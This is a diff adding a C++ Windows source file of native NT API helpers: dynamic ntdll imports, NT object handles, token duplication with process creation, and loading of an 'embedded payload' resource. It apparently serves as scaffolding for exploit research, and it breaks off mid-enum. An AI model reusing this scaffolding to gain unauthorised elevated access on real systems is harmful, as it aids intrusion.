@@ -1,0 +1,1632 @@
+#define WIN32_LEAN_AND_MEAN
+#include <algorithm>
+#include <iostream>
+#include <memory>
+#include <string>
+#include <vector>
+#include <array>
+#include <unordered_map>
+#include <set>
+#include <functional>
+#include <variant>
+#include <algorithm>
+#include <iostream>
+#include <memory>
+#include <string>
+#include <vector>
+#include <array>
+#include <unordered_map>
+#include <set>
+#include <functional>
+#include <stdio.h>
+#include <fstream>
+#include <thread>  
+#include <sstream> 
+#include <filesystem>  
+#include <regex>
+
+/*
+typedef signed char           INT8, * PINT8;
+typedef signed short          INT16, * PINT16;
+typedef signed int            INT32, * PINT32;
+typedef signed __int64        INT64, * PINT64;
+typedef unsigned char         UINT8, * PUINT8;
+typedef unsigned short        UINT16, * PUINT16;
+typedef unsigned int          UINT32, * PUINT32;
+typedef unsigned __int64      UINT64, * PUINT64;
+typedef signed int            LONG32, * PLONG32;
+typedef unsigned int          ULONG32, * PULONG32;
+typedef unsigned int          DWORD32, * PDWORD32;
+typedef char                  CHAR;
+typedef short                 SHORT;
+typedef long                  LONG;
+typedef __int64 INT_PTR, * PINT_PTR;
+typedef unsigned __int64 UINT_PTR, * PUINT_PTR;
+
+typedef unsigned long ULONG;
+typedef ULONG* PULONG;
+typedef unsigned short USHORT;
+typedef USHORT* PUSHORT;
+typedef unsigned char UCHAR;
+typedef UCHAR* PUCHAR;
+typedef _Null_terminated_ char* PSZ;
+
+typedef __int64 LONG_PTR, * PLONG_PTR;
+typedef unsigned __int64 ULONG_PTR, * PULONG_PTR;
+
+#define POINTER_64 __ptr64
+typedef unsigned __int64 POINTER_64_INT;
+ 
+#define POINTER_32 __ptr32
+
+typedef void* PVOID;
+typedef void* POINTER_64 PVOID64;
+typedef __int64 LONGLONG;
+typedef unsigned __int64 ULONGLONG;
+typedef ULONG_PTR SIZE_T, * PSIZE_T;
+typedef LONG_PTR SSIZE_T, * PSSIZE_T;
+
+#define WINAPI      __stdcall
+using WCHAR = wchar_t;
+
+typedef WCHAR* PWCHAR, * LPWCH, * PWCH;
+typedef const WCHAR* LPCWCH, * PCWCH;
+  
+typedef   const WCHAR* LPCWSTR, * PCWSTR;
+ 
+typedef void* HANDLE;
+#define DECLARE_HANDLE(name) struct name##__{int unused;}; typedef struct name##__ *name
+
+DECLARE_HANDLE(HINSTANCE);
+typedef HINSTANCE HMODULE;
+HMODULE WINAPI GetProcAddress(    HMODULE hModule,   LPCSTR lpProcName);
+HMODULE WINAPI LoadLibraryW(     LPCWSTR lpLibFileName);
+HMODULE WINAPI GetModuleHandleW(     LPCWSTR lpModuleName);
+
+typedef _Null_terminated_ const CHAR* LPCSTR, * PCSTR;
+#define LANG_NEUTRAL                     0x00
+#define SUBLANG_DEFAULT                             0x01
+#define MAKELANGID(p, s)       ((((WORD  )(s)) << 10) | (WORD  )(p))
+#define FORMAT_MESSAGE_ALLOCATE_BUFFER 0x00000100
+#define FORMAT_MESSAGE_FROM_HMODULE    0x00000800
+#define FORMAT_MESSAGE_FROM_SYSTEM     0x00001000
+IMPORTAPI(L"kernel32.DLL", FormatMessage, DWORD, DWORD dwFlags, LPCVOID lpSource, DWORD dwMessageId, DWORD dwLanguageId, LPTSTR lpBuffer, DWORD nSize, va_list* Arguments)
+
+*/
+#include <Windows.h>
+#include <type_traits>
+#include "resource.h"
+
+using namespace std;
+using namespace std::filesystem;
+   
+using NTSTATUS = LONG;
+static constexpr bool NT_SUCCESS(NTSTATUS status) { return status >= 0; }
+
+#define TOKENIZE(x) #x
+#define CONCAT( X, Y ) X##Y
+  
+template< typename modHandleType, typename procNameType >
+auto getProcAddressOrThrow(modHandleType modHandle, procNameType procName) {
+   auto address = GetProcAddress(modHandle, procName);
+   if (address == nullptr) throw exception{ ("Error importing: "s + procName).c_str() };
+   return address;
+}
+
+// Notice- the comma operator is used to make sure the dll is loaded, discard the result- then getModuleHandle is used
+#define IMPORTAPI( DLLFILE, FUNCNAME, RETTYPE, ... )                                                                        \
+   typedef RETTYPE( WINAPI* CONCAT( t_, FUNCNAME ) )( __VA_ARGS__ );                                                        \
+   template< typename... Ts >                                                                                               \
+   auto FUNCNAME( Ts... ts ) {                                                                                              \
+      const static CONCAT( t_, FUNCNAME ) func =                                                                            \
+       (CONCAT( t_, FUNCNAME )) getProcAddressOrThrow( ( LoadLibraryW( DLLFILE ), GetModuleHandleW( DLLFILE ) ), #FUNCNAME ); \
+      return func(  forward< Ts >( ts )... );                                                                           \
+   }; 
+
+IMPORTAPI(L"NTDLL.DLL", RtlNtStatusToDosError, HRESULT, NTSTATUS)
+wstring formatErrorCode(NTSTATUS Err)
+{
+   void* lpMessageBuffer;
+   auto Hand = LoadLibraryW(L"NTDLL.DLL");
+   FormatMessage( FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_FROM_HMODULE, Hand, Err, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPTSTR)&lpMessageBuffer, 0, NULL);
+   wstring ws{ (wchar_t*) lpMessageBuffer };
+   LocalFree(lpMessageBuffer);
+   if(Hand)FreeLibrary(Hand);
+   return ws;
+}
+
+struct abortError : public exception {
+   using exception::exception; abortError(string e) : exception{ e.c_str() } { cout << e << endl; }
+   abortError(wstring w) : abortError{ string{ w.begin(), w.end() } } {}
+};
+#define THROW_ON_ERR( CODE ) { auto RET = ( CODE ) ; if( !NT_SUCCESS( RET ) ){ auto err = formatErrorCode( RET) ;                                                                     \
+                                                                               throw abortError{ ( string{ TOKENIZE(CODE) } + " returned: "s + string{ err.begin(), err.end() } ) };  \
+                                                                             }                                                                                                        \
+                             };
+
+namespace NT { typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PCWSTR  Buffer; } UNICODE_STRING, * PUNICODE_STRING; }
+using namespace NT;
+
+namespace strings
+{
+   struct str;
+   struct wstr;
+
+   template< typename STR >
+   struct str_addons
+   {
+      auto asHex(bool frames = false, const char* prepend = "", const char* spacer = " ") {
+         stringstream result;
+         if (frames) { result << "     0  1  2  3  4  5  6  7  8  9  a  b  c  d  e  f  0123456789abcdef"; }
+         size_t counter = 0;
+         string asAscii = "";
+         auto asNarrow = *static_cast<str*>(this);
+         for (unsigned char c : asNarrow)
+         {
+            if (frames) {
+               asAscii = asAscii + ((c >= ' ' && c <= '~') ? static_cast<char>(c) : '.');
+
+               if ( counter % 0xf == 0 ) {
+                  result << asAscii << endl;
+                  asAscii = "";
+                  result  << hex << uppercase << setw(2) << setfill( '0') << counter;
+                  result << ": ";
+               }
+            }
+            counter++;
+            result << prepend << hex << uppercase << setw(2) << setfill( '0') << static_cast<unsigned int>(c);
+            result << ((counter != asNarrow.size()  ) ? spacer : "");
+         }
+         return  STR{  result.str()  } ;
+      }
+      auto upperCase() { auto tmp = *static_cast<STR*>(this); std::transform(tmp.begin(), tmp.end(), tmp.begin(), ::toupper); return tmp; }
+      auto lowerCase() { auto tmp = *static_cast<STR*>(this); std::transform(tmp.begin(), tmp.end(), tmp.begin(), ::tolower); return tmp; }
+      auto replaceSubstr(const char* from,const char* to) { return STR{std::regex_replace(*static_cast<STR*>(this), std::regex(from), to)}; }
+   };
+   struct wstr : public wstring, str_addons< wstr > 
+   {
+      const UNICODE_STRING uni;
+      wstr(string s) : wstr{ wstring{ s.begin(), s.end() } } {}
+      
+      template<typename ...Ts>
+      wstr(const char* s, Ts... ts) : wstr{ string{s, forward<Ts>(ts)... } } {}
+      wstr(UNICODE_STRING uni) : wstr{ wstring{uni.Buffer,uni.Length} } {}
+      wstr(nullptr_t) : wstr { L"" } {}
+
+      template<typename ...Ts>
+      wstr(Ts ...ts) : wstring{ forward<Ts>(ts)... }, uni{ static_cast<unsigned short>( size() * sizeof(wchar_t) ), static_cast<unsigned short>( size() * sizeof(wchar_t) ), data() }  {}
+     
+      operator string() { return string{ begin(), end() }; }
+      operator UNICODE_STRING*(){ return const_cast<UNICODE_STRING*>(&uni); }
+     };
+
+   struct str : public string, str_addons< str > { 
+      using string::string; 
+      template<typename ...Ts>
+      str(  char* s, Ts... ts) :  string{s, forward<Ts>(ts)... }  {}
+
+      str(string s) : string{ s } {}
+      str(wstring ws) : string{ ws.begin(), ws.end() } {}
+   };
+
+   using strstream = std::basic_ostream< char, std::char_traits< char > >;
+
+   strstream& operator<< (strstream& os, const std::wstring& ws) { return os << str{ ws }; }
+   strstream& operator<< (strstream& os, const wchar_t* ws) { return os << str{ ws }; }
+}
+using namespace strings;
+
+template< int RESID > vector<unsigned char> getResource()
+{
+   HRSRC resourceHandle = FindResource(nullptr, MAKEINTRESOURCE(RESID), RT_RCDATA); if (resourceHandle == nullptr) throw std::exception{ "Could not find embedded payload resource" };
+   HGLOBAL dataHandle = LoadResource(nullptr, resourceHandle); if (dataHandle == nullptr) throw std::exception{ "Could not load embedded payload resource" };
+   DWORD resourceSize = SizeofResource(nullptr, resourceHandle); if (!resourceSize) throw std::exception{ "Embedded payload resource size is invalid( 0 )" };
+   auto s= string{ reinterpret_cast<const char*>(LockResource(dataHandle)) , resourceSize };
+   return { s.begin(), s.end() };
+ };
+ 
+namespace mfiles {
+   struct dirEntry { const wstr filename;  const bool isDir; };
+   using direntries = list< dirEntry >;
+
+   struct filepath : public str {
+      using str::str;
+   private:
+      str expandEnvStr(char* unexpanded) {
+         vector<char>  expandedBuffer;
+         expandedBuffer.resize( ExpandEnvironmentStringsA( unexpanded, nullptr, 0 ) );
+         THROW_ON_ERR( ExpandEnvironmentStringsA( unexpanded, &expandedBuffer[0], static_cast< USHORT >( expandedBuffer.size() ) ) );
+         return &expandedBuffer[0];
+      }
+   public:
+      template< typename T > filepath(T t) : str{ expandEnvStr(t).replace("/"s , "\\"s).upperCase() } {}
+      operator path() { return path{ this->c_str() }; }
+
+      vector<unsigned char> readFile() {
+         str filename = this->replaceSubstr("/" , "\\");
+         if (!filesystem::exists(filename.c_str())) { throw exception{ "file no exist" }; }
+         if (!filesystem::is_regular_file(filename.c_str())) { return {}; }
+
+         cout << "Opening: " << filename << " for returning" << endl;
+         ifstream filecontent{ filename.c_str() , std::ios::binary };
+         stringstream buffer;
+         buffer << filecontent.rdbuf();
+         auto ii = buffer.str();
+         return {ii.begin(),ii.end()};
+      }
+
+      direntries enumDir(str relativeTo = "C:\\\\"s, bool forwardSlashes = false) {
+         if (!filesystem::exists(*this)) throw exception{ ("directory no exist:"s + *this).c_str() };
+         if (filesystem::is_regular_file(*this)) {
+            auto name =  str{ *this };
+            auto wname = wstr{ string{name.c_str()} };
+            if (relativeTo != "") name = name.replaceSubstr(relativeTo.c_str(), "");
+            if (forwardSlashes) name = name.replaceSubstr("\\\\", "/");
+            return { {  wname, false } };
+         }
+         direntries dirContent{   };
+         for (const auto& f : directory_iterator{ path { *this  } }) {
+            try {
+               if (f.path().has_filename() && !f.is_symlink()) {
+                  auto name = str{ f.path().filename().string() };
+
+                  if (relativeTo != "") name = name.replaceSubstr(relativeTo.c_str(), "");
+                  if (forwardSlashes) name = name.replaceSubstr("\\\\", "/");
+
+//                  dirContent.emplace_back(name, f.is_directory());
+               }
+            }
+            catch (std::exception& e) { cout << (e.what()) << endl; }
+         }
+         return dirContent;
+      }
+   };
+}
+using namespace mfiles;
+namespace processes {
+   struct mprocess {
+      HANDLE hProcess;
+      HANDLE hThread;
+      mprocess(wstr executable, wstr args = L"", wstr currDir = L"", bool suspended = false, HANDLE token = GetCurrentThreadToken()) {
+         STARTUPINFO startInfo{ 0x00 };
+         startInfo.cb = sizeof(startInfo);
+         startInfo.wShowWindow = SW_SHOW;
+         startInfo.lpDesktop = const_cast<wchar_t*>(L"WinSta0\\Default");
+
+         PROCESS_INFORMATION procInfo = { 0x00 };
+         HANDLE hToken = {};
+         DuplicateTokenEx(token, TOKEN_ALL_ACCESS, nullptr, SecurityAnonymous, TokenPrimary, &hToken);
+         if (CreateProcessAsUser(hToken, executable.c_str(), const_cast<wchar_t*>(args.c_str()), nullptr, nullptr, FALSE, NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE | (suspended ? CREATE_SUSPENDED : 0), nullptr, nullptr, &startInfo, &procInfo)) {
+            hProcess = procInfo.hProcess;
+            hThread = procInfo.hThread;
+         }
+         else throw  exception{ ("Error executing: "s + str{executable}).c_str() };
+      }
+      ~mprocess() { CloseHandle(hProcess); CloseHandle(hThread); }
+   };
+}
+using namespace processes;
+ 
+namespace NT
+{ 
+   template<class T,  enable_if_t< is_enum_v<T>, int> = 0>
+   constexpr T operator|(T lhs, T rhs) { return static_cast<T>( static_cast<underlying_type<T>::type>(lhs) | static_cast<underlying_type<T>::type>(rhs) ); }
+
+   template<size_t N> struct StringLiteral { char value[N]; constexpr StringLiteral(const char(&str)[N]) { copy_n(str, N, value); } };
+
+   enum class OBJ_ATTRIBUT : ULONG { INHERIT = 0x00000002L, PERMANENT = 0x00000010L,  EXCLUSIVE = 0x00000020L, CASE_INSENSITIVE = 0x00000040L, OPENIF = 0x00000080L, OPENLINK = 0x00000100L, KERNEL_HANDLE = 0x00000200L, FORCE_ACCESS_CHECK = 0x00000400L, IGNORE_IMPERSONATED_DEVICEMAP = 0x00000800L, DONT_REPARSE = 0x00001000L, VALID_ATTRIBUTES = 0x00001FF2L };
+   struct OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory;  UNICODE_STRING* ObjectName; OBJ_ATTRIBUT Attributes; PVOID s; PVOID ss; };
+
+   enum class ACCESS : ULONG{ AXX_DELETE = 0x00010000, AXX_READ_CONTROL = 0x00020000, AXX_SYNCHRONIZE = 0x00100000, AXX_WRITE_DAC = 0x00040000, AXX_WRITE_OWNER = 0x00080000, AXX_GENERIC_EXECUTE = 0x20000000, AXX_GENERIC_READ = 0x80000000, AXX_GENERIC_WRITE = 0x40000000, AXX_MAXIMUM = 0x02000000, AXX_MEMORY_PARTITION_ALL_ACCESS = 0x00000001, AXX_MEMORY_PARTITION_QUERY_ACCESS = 0x00000001, AXX_MEMORY_PARTITION_MODIFY_ACCESS = 0x00000002, AXX_FILE_READ_DATA = 0x00000001, AXX_FILE_WRITE_DATA = 0x00000002, AXX_FILE_APPEND_DATA = 0x00000004, AXX_FILE_READ_EA = 0x00000008, AXX_FILE_WRITE_EA = 0x00000010, AXX_FILE_EXECUTE = 0x00000020, AXX_FILE_DELETE_CHILD = 0x00000040, AXX_FILE_READ_ATTRIBUTES = 0x00000080, AXX_FILE_WRITE_ATTRIBUTES = 0x00000100, AXX_ACCESS_SYSTEM_SECURITY = 0x01000000, AXX_KEY_QUERY_VALUE = 0x0001, AXX_KEY_SET_VALUE = 0x0002, AXX_KEY_CREATE_SUB_KEY = 0x0004, AXX_KEY_ENUMERATE_SUB_KEYS = 0x0008, AXX_KEY_NOTIFY = 0x0010, AXX_KEY_CREATE_LINK  = 0x0020, AXX_DIRECTORY_QUERY = 0x0001, AXX_DIRECTORY_TRAVERSE = 0x0002, AXX_DIRECTORY_CREATE_OBJECT = 0x0004, AXX_DIRECTORY_CREATE_SUBDIRECTORY = 0x0008, AXX_SYMBOLIC_LINK_QUERY = 0x0001, AXX_THREAD_TERMINATE = 0x0001, AXX_THREAD_SUSPEND_RESUME = 0x0002, AXX_THREAD_ALERT = 0x0004, AXX_THREAD_GET_CONTEXT = 0x0008, AXX_THREAD_SET_CONTEXT = 0x0010, AXX_THREAD_SET_INFORMATION = 0x0020, AXX_THREAD_SET_LIMITED_INFORMATION = 0x0400, AXX_THREAD_QUERY_LIMITED_INFORMATION = 0x0800, AXX_PROCESS_CREATE_THREAD = 0x0002, AXX_PROCESS_SET_SESSIONID = 0x0004, AXX_PROCESS_VM_OPERATION = 0x0008, AXX_PROCESS_VM_WRITE = 0x0020, AXX_PROCESS_CREATE_PROCESS = 0x0080, AXX_PROCESS_SET_QUOTA = 0x0100, AXX_PROCESS_SET_INFORMATION = 0x0200, AXX_PROCESS_QUERY_LIMITED_INFORMATION = 0x1000, AXX_PROCESS_DUP_HANDLE = 0x0040, AXX_PROCESS_QUERY_INFORMATION = 0x0400, AXX_PROCESS_SUSPEND_RESUME = 0x0800, AXX_PROCESS_TERMINATE = 0x0001, AXX_PROCESS_VM_READ = 0x0010, AXX_EVENT_QUERY_STATE = 0x0001, AXX_EVENT_MODIFY_STATE = 0x0002, AXX_SEMAPHORE_QUERY_STATE = 0x0001, AXX_SEMAPHORE_MODIFY_STATE = 0x0002, AXX_TOKEN_ASSIGN_PRIMARY = 0x0001, AXX_TOKEN_DUPLICATE = 0x0002, AXX_TOKEN_IMPERSONATE = 0x0004, AXX_TOKEN_QUERY = 0x0008, AXX_TOKEN_QUERY_SOURCE = 0x0010, AXX_TOKEN_ADJUST_PRIVILEGES = 0x0020, AXX_TOKEN_ADJUST_GROUPS = 0x0040, AXX_TOKEN_ADJUST_DEFAULT = 0x0080, AXX_TOKEN_ADJUST_SESSIONID = 0x0100, AXX_SECTION_QUERY = 0x0001, AXX_SECTION_MAP_WRITE = 0x0002, AXX_SECTION_MAP_READ = 0x0004, AXX_SECTION_MAP_EXECUTE = 0x0008, AXX_SECTION_EXTEND_SIZE = 0x0010, AXX_SECTION_MAP_EXECUTE_EXPLICIT = 0x0020, AXX_PORT_ALL_ACCESS = 0x00000001, AXX_PORT_CONNECT = 0x00000002, AXX_DEBUG_ALL_ACCESS = 0x01F000F, AXX_DEBUG_READ_EVENT = 0x00000001, AXX_DEBUG_QUERY_INFORMATION = 0x00000008, AXX_DEBUG_PROCESS_ASSIGN = 0x00000002, AXX_DEBUG_SET_INFORMATION = 0x00000004, AXX_DESKTOP_ENUMERATE = 0x0040, AXX_DESKTOP_READOBJECTS = 0x00000001, AXX_DESKTOP_JOURNALPLAYBACK = 0x0020, AXX_DESKTOP_WRITEOBJECTS = 0x0080, AXX_DESKTOP_CREATEWINDOW = 0x00000002, AXX_DESKTOP_CREATEMENU = 0x0004, AXX_DESKTOP_HOOKCONTROL = 0x0008, AXX_DESKTOP_JOURNALRECORD = 0x0010, AXX_DESKTOP_SWITCHDESKTOP = 0x0100, AXX_EVENT_PAIR_ALL_ACCESS = 0x00000001, AXX_IO_COMPLETION_ALL_ACCESS = 0x001F0003, AXX_IO_COMPLETION_QUERY_STATE = 0x00000001, AXX_IO_COMPLETION_MODIFY_STATE = 0x00000002, AXX_JOB_OBJECT_ALL_ACCESS = 0x1F001F, AXX_JOB_OBJECT_QUERY = 0x0004, AXX_JOB_OBJECT_ASSIGN_PROCESS = 0x00000001, AXX_JOB_OBJECT_SET_ATTRIBUTES = 0x00000002, AXX_JOB_OBJECT_SET_SECURITY_ATTRIBUTES = 0x0010, AXX_JOB_OBJECT_TERMINATE = 0x0008, AXX_KEYEDEVENT_ALL_ACCESS =  0x00000001, AXX_KEYEDEVENT_WAIT = 0x00000001, AXX_KEYEDEVENT_WAKE = 0x00000002, AXX_PROFILE_ALL_ACCESS =   0x00000001, AXX_PROFILE_CONTROL = 0x00000001, AXX_SESSION_ALL_ACCESS = 0x00000001, AXX_SESSION_QUERY_ACCESS = 0x00000001, AXX_SESSION_MODIFY_ACCESS = 0x00000002, AXX_TIMER_ALL_ACCESS =  0x00000001, AXX_TIMER_QUERY_STATE = 0x00000001, AXX_TIMER_MODIFY_STATE = 0x00000002, AXX_ENLISTMENT_ALL_ACCESS = 0x00000001, AXX_ENLISTMENT_GENERIC_WRITE = 0x00000001, AXX_ENLISTMENT_QUERY_INFORMATION = 0x00000001, AXX_ENLISTMENT_SET_INFORMATION = 0x00000002, AXX_ENLISTMENT_RECOVER = 0x00000004, AXX_ENLISTMENT_SUBORDINATE_RIGHTS = 0x00000008, AXX_ENLISTMENT_SUPERIOR_RIGHTS = 0x00000010, AXX_MUTANT_ALL_ACCESS = 0x00000001, AXX_MUTANT_QUERY_STATE = 0x00000001, AXX_RESOURCEMANAGER_ALL_ACCESS = 0x00000001, AXX_RESOURCEMANAGER_GENERIC_WRITE = 0x00000001, AXX_RESOURCEMANAGER_QUERY_INFORMATION = 0x00000001, AXX_RESOURCEMANAGER_SET_INFORMATION = 0x00000002, AXX_RESOURCEMANAGER_GET_NOTIFICATION = 0x00000010, AXX_RESOURCEMANAGER_ENLIST = 0x00000008, AXX_RESOURCEMANAGER_RECOVER = 0x00000004, AXX_RESOURCEMANAGER_REGISTER_PROTOCOL = 0x00000020, AXX_RESOURCEMANAGER_COMPLETE_PROPAGATION = 0x00000040, AXX_TRANSACTIONMANAGER_ALL_ACCESS = 0x00000001, AXX_TRANSACTIONMANAGER_GENERIC_WRITE = 0x00000001, AXX_TRANSACTIONMANAGER_QUERY_INFORMATION = 0x00000001, AXX_TRANSACTIONMANAGER_SET_INFORMATION = 0x0002, AXX_TRANSACTIONMANAGER_RECOVER = 0x0004, AXX_TRANSACTIONMANAGER_RENAME = 0x0008, AXX_TRANSACTIONMANAGER_CREATE_RM = 0x0010, AXX_TRANSACTIONMANAGER_BIND_TRANSACTION = 0x0020, AXX_TRANSACTION_ALL_ACCESS = 0x00000001, AXX_TRANSACTION_GENERIC_WRITE = 0x00000001, AXX_TRANSACTION_QUERY_INFORMATION = 0x00000001, AXX_TRANSACTION_SET_INFORMATION = 0x0002, AXX_TRANSACTION_ENLIST = 0x0004, AXX_TRANSACTION_COMMIT = 0x0008, AXX_TRANSACTION_ROLLBACK = 0x0010, AXX_TRANSACTION_PROPAGATE = 0x0020,  AXX_WINSTA_GENERIC_WRITE = 0x00000001, AXX_WINSTA_ENUMERATE = 0x0100L, AXX_WINSTA_ENUMDESKTOPS = 0x0001L, AXX_WINSTA_READATTRIBUTES = 0x0002L, AXX_WINSTA_READSCREEN = 0x0200L, AXX_WINSTA_ACCESSCLIPBOARD = 0x0004L, AXX_WINSTA_ACCESSGLOBALATOMS = 0x0020L, AXX_WINSTA_CREATEDESKTOP = 0x0008L, AXX_WINSTA_WRITEATTRIBUTES = 0x0010L, AXX_WINSTA_EXITWINDOWS = 0x0040L, AXX_OBJECT_TYPE_ALL_ACCESS = 0x00000001, AXX_OBJECT_TYPE_CREATE = 0x00000001, AXX_WORKER_FACTORY_ALL_ACCESS = 0x00000001, AXX_WORKER_FACTORY_RELEASE_WORKER = 0x00000001, AXX_WORKER_FACTORY_READY_WORKER = 0x0010, AXX_WORKER_FACTORY_WAIT = 0x0002, AXX_WORKER_FACTORY_SET_INFORMATION = 0x0004, AXX_WORKER_FACTORY_QUERY_INFORMATION = 0x0008, AXX_WORKER_FACTORY_SHUTDOWN = 0x0020, AXX_SECTION_ALL_ACCESS  = (STANDARD_RIGHTS_REQUIRED|SECTION_QUERY|SECTION_MAP_WRITE |SECTION_MAP_WRITE | SECTION_MAP_READ | SECTION_MAP_EXECUTE | SECTION_EXTEND_SIZE)  };
+  
+   struct params{ HANDLE RootDirectory{ 0x00 }; wstr ObjectName; OBJ_ATTRIBUT Attributes = OBJ_ATTRIBUT::CASE_INSENSITIVE; ACCESS DesiredAccess = ( ACCESS::AXX_MAXIMUM  ); };
+
+   template< typename SPECTYPE >
+   class NTObj {
+   private:
+      HANDLE privHandle = INVALID_HANDLE_VALUE;
+   public:
+      template<typename ...REST>
+      NTObj(HANDLE* h ,REST ... ) : privHandle{ *h } {}
+
+      IMPORTAPI(L"NTDLL.DLL", NtClose, NTSTATUS, HANDLE)
+      ~NTObj() { if (privHandle != INVALID_HANDLE_VALUE) { NtClose(privHandle); } }
+      
+      IMPORTAPI(L"NTDLL.DLL", NtDuplicateObject, NTSTATUS, HANDLE SourceProcessHandle, HANDLE SourceHandle, HANDLE TargetProcessHandle, PHANDLE TargetHandle, ACCESS_MASK DesiredAccess, ULONG HandleAttributes, ULONG Options)
+      NTObj(const NTObj& other) { THROW_ON_ERR( NtDuplicateObject( GetCurrentProcess(), other.privHandle, GetCurrentProcess(), &privHandle, 0,static_cast<ULONG> (OBJ_ATTRIBUT::OPENIF | OBJ_ATTRIBUT::CASE_INSENSITIVE), DUPLICATE_SAME_ACCESS ) ); }
+      
+      auto getHandle() { return privHandle; }
+      
+      template< StringLiteral NTFUNC, typename ...REQUIREDARGS >
+      static SPECTYPE make( REQUIREDARGS ... ra )
+      {
+         using syscallSignature = NTSTATUS(WINAPI*)( REQUIREDARGS ... );                                                                                     \
+         const static syscallSignature ntFunc = (syscallSignature) GetProcAddress( GetModuleHandle( L"ntdll.dll" ), str{ NTFUNC.value }.c_str() );
+         THROW_ON_ERR( ntFunc( forward< REQUIREDARGS >(ra)... ) );
+         return SPECTYPE{ forward< REQUIREDARGS >(ra)...   };
+      }
+
+      template< StringLiteral NTFUNC, typename ...REQUIREDARGS >
+      static SPECTYPE make( params  p, REQUIREDARGS... ra )
+      { 
+         OBJECT_ATTRIBUTES oa{ sizeof(OBJECT_ATTRIBUTES), p.RootDirectory, ( p.ObjectName == L""s ? nullptr :  p.ObjectName  ), p.Attributes, 0 , 0 };
+         OBJECT_ATTRIBUTES* oa_ptr = ( p.RootDirectory == nullptr && p.ObjectName == L""s ) ? nullptr : &oa;
+         HANDLE h{ 0x00 };
+         return make< NTFUNC, HANDLE*, ACCESS_MASK , OBJECT_ATTRIBUTES*, REQUIREDARGS...>( &h, static_cast<DWORD>(p.DesiredAccess), oa_ptr, forward< REQUIREDARGS >(ra)... );
+      }
+
+      struct OBJECT_NAME_INFORMATION { UNICODE_STRING Name; };
+      enum class OBJECT_INFORMATION_CLASS { ObjectBasicInformation = 0, ObjectNameInformation = 1, ObjectTypeInformation = 2, ObjectTypesInformation = 3, ObjectHandleFlagInformation = 4, ObjectSessionInformation = 5, ObjectSessionObjectInformation = 6, MaxObjectInfoClass = 7 };
+      IMPORTAPI(L"NTDLL.DLL", NtQueryObject, NTSTATUS, HANDLE, OBJECT_INFORMATION_CLASS, PVOID, ULONG, PULONG)
+      wstr getNTPath() {
+         DWORD bufferlen = 0;
+         OBJECT_NAME_INFORMATION* name = nullptr;
+         THROW_ON_ERR( NtQueryObject(privHandle, OBJECT_INFORMATION_CLASS::ObjectNameInformation, name, bufferlen, &bufferlen) );
+         if (bufferlen) {
+            name = reinterpret_cast<OBJECT_NAME_INFORMATION*>(new BYTE[bufferlen]);
+            THROW_ON_ERR( NtQueryObject(privHandle, OBJECT_INFORMATION_CLASS::ObjectNameInformation, name, bufferlen, &bufferlen) );
+            return { name->Name.Buffer };
+         }
+         throw exception("Could not retreive object name");
+      }
+       
+      IMPORTAPI(L"NTDLL.DLL", NtMakePermanentObject, NTSTATUS, HANDLE)
+      void makePermanent() { THROW_ON_ERR( NtMakePermanentObject(privHandle) ); }
+    
+      IMPORTAPI(L"NTDLL.DLL", NtMakeTemporaryObject, NTSTATUS, HANDLE, PLONG)
+      void makeTemporary() { THROW_ON_ERR( NtMakeTemporaryObject(privHandle) ); }
+     
+      IMPORTAPI(L"NTDLL.DLL", NtWaitForSingleObject, NTSTATUS, HANDLE ObjectHandle, BOOLEAN Alertable, LARGE_INTEGER* TimeOut)
+      auto waitForSignal( LARGE_INTEGER* timeout = NULL ) { return NtWaitForSingleObject(privHandle,true, timeout); }
+     
+      enum class EVENT_TYPE { NotificationEvent, SynchronizationEvent };
+      IMPORTAPI(L"NTDLL.DLL", NtSetEvent, NTSTATUS, HANDLE, PLONG)
+      auto signalPulse() { LONG prevState = 0; THROW_ON_ERR( NtSetEvent( privHandle, &prevState ) ); return prevState; }
+   };
+   namespace files
+   {
+      struct IO_STATUS_BLOCK { union { NTSTATUS Status; PVOID Pointer; }; ULONG_PTR Information; };
+      typedef void (IO_APC_ROUTINE)(void* ApcContext, IO_STATUS_BLOCK* IoStatusBlock, unsigned long reserved);
+
+      enum class FILE_DIRECTORY_INFO_CLASS { FileDirectoryInformation = 1, FileFullDirectoryInformation = 2, FileBothDirectoryInformation = 3, FileNamesInformation = 12, FileIdBothDirectoryInformation = 37, FileIdFullDirectoryInformation = 38, FileIdExtdDirectoryInformation = 60 ,FileIdExtdBothDirectoryInformation = 63  };
+      enum class FILE_INFORMATION_CLASS { FileBasicInformation = 4, FileStandardInformation = 5, FileInternalInformation = 6, FileEaInformation = 7, FileAccessInformation = 8, FileNameInformation = 9, FileRenameInformation = 10, FileLinkInformation = 11, FileDispositionInformation = 13, FilePositionInformation = 14, FileFullEaInformation = 15, FileModeInformation = 16, FileAlignmentInformation = 17, FileAllInformation = 18, FileAllocationInformation = 19, FileEndOfFileInformation = 20, FileAlternateNameInformation = 21, FileStreamInformation = 22, FilePipeInformation = 23, FilePipeLocalInformation = 24, FilePipeRemoteInformation = 25, FileMailslotQueryInformation = 26, FileMailslotSetInformation = 27, FileCompressionInformation = 28, FileObjectIdInformation = 29, FileCompletionInformation = 30, FileMoveClusterInformation = 31, FileQuotaInformation = 32, FileReparsePointInformation = 33, FileNetworkOpenInformation = 34, FileAttributeTagInformation = 35, FileTrackingInformation = 36, FileValidDataLengthInformation = 39, FileShortNameInformation = 40, FileIoCompletionNotificationInformation = 41, FileIoStatusBlockRangeInformation = 42, FileIoPriorityHintInformation = 43, FileSfioReserveInformation = 44, FileSfioVolumeInformation = 45, FileHardLinkInformation = 46, FileProcessIdsUsingFileInformation = 47, FileNormalizedNameInformation = 48, FileNetworkPhysicalNameInformation = 49, FileIdGlobalTxDirectoryInformation = 50, FileIsRemoteDeviceInformation = 51, FileUnusedInformation = 52, FileNumaNodeInformation = 53, FileStandardLinkInformation = 54, FileRemoteProtocolInformation = 55, FileRenameInformationBypassAccessCheck = 56, FileLinkInformationBypassAccessCheck = 57, FileVolumeNameInformation = 58, FileIdInformation = 59, FileReplaceCompletionInformation = 61, FileHardLinkFullIdInformation = 62,  FileDispositionInformationEx = 64, FileRenameInformationEx = 65, FileRenameInformationExBypassAccessCheck = 66, FileDesiredStorageClassInformation = 67, FileStatInformation = 68, FileMemoryPartitionInformation = 69, FileStatLxInformation = 70, 